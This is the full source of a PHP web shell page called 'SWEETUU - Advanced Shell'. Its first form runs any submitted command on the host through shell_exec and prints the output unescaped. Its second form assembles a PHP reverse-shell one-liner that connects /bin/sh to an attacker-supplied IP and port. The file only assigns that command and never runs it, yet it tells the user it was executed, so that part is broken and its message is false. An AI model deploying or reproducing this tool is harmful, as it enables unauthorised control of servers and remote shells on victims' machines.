<?php 
/*
    =======================================================================================
    |   Name   : SWEETUU - Advanced Shell by CSPSHIVAM                                   |
    |   Owner  : CSPSHIVAM                                                               |
    |   Social : @iamshivamz                                                             |
    =======================================================================================
*/
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SWEETUU - Advanced Shell</title>
    <link rel="stylesheet" href="style.css">
    <style>
        body {
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background-color: #000;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        h1, h2 {
            background: linear-gradient(90deg, #ff7e5f, #feb47b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        input[type="text"] {
            padding: 10px;
            margin: 10px;
            border-radius: 5px;
            border: 1px solid #fff;
            background-color: #222;
            color: white;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background-color: #ff7e5f;
            border: none;
            color: white;
            font-weight: bold;
            border-radius: 5px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #feb47b;
        }
        .divider {
            margin: 20px 0;
            border-top: 1px solid #444;
            width: 80%;
        }
        footer {
            margin-top: 20px;
        }
        footer a {
            color: #ff7e5f;
            text-decoration: none;
            font-weight: bold;
            margin: 0 10px;
        }
        footer a:hover {
            color: #feb47b;
        }
    </style>
</head>
<body>
    <h1>SWEETUU</h1>
    <p>Advanced Shell by <a href="https://www.linkedin.com/in/iamshivamz" target="_blank">@CSPSHIVAM</a></p>
    
    <div class="divider"></div>

    <h2>WEB-SHELL</h2>
    <form action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" method="POST">
        <label for="cmd">COMMAND:</label>
        <input type="text" name="cmd" id="cmd" placeholder="Enter command">
        <input type="submit" name="submit" value="RUN">
    </form>

    <div class="divider"></div>

    <h2>REVERSE SHELL USING PHP</h2>
    <p><i>*Note: Don't forget to start the listener</i></p>
    <form action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" method="POST">
        <label for="ip">IP:</label>
        <input type="text" name="ip" id="ip" placeholder="Enter IP">
        <label for="port">PORT:</label>
        <input type="text" name="port" id="port" placeholder="Enter Port">
        <input type="submit" name="submit" value="GET SHELL">
    </form>

    <div class="divider"></div>

    <?php
    if (isset($_POST["cmd"])) {
        $cmd = $_POST["cmd"];
        $output = shell_exec("$cmd 2>&1");
        echo "<h2>Command Output:</h2>";
        echo "<pre style='text-align:left;background-color:#222;padding:10px;border-radius:5px;color:#0f0;'>$output</pre>";
    }

    if (isset($_POST["ip"]) && isset($_POST["port"])) {
        $ip = $_POST["ip"];
        $port = $_POST["port"];
        $sock = "sock";
        $cmd = "php -r '$" . $sock . "=fsockopen(\"$ip\",$port);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
        echo "<p style='color:#ff7e5f;'>Reverse shell command executed. Check your listener!</p>";
    }
    ?>

    <footer>
        <a href="https://www.instagram.com/cspshivam" target="_blank">Instagram</a>
        <a href="https://www.linkedin.com/in/iamshivamz" target="_blank">LinkedIn</a>
        <a href="https://www.github.com/cspshivam" target="_blank">GitHub</a>
    </footer>
</body>
</html>
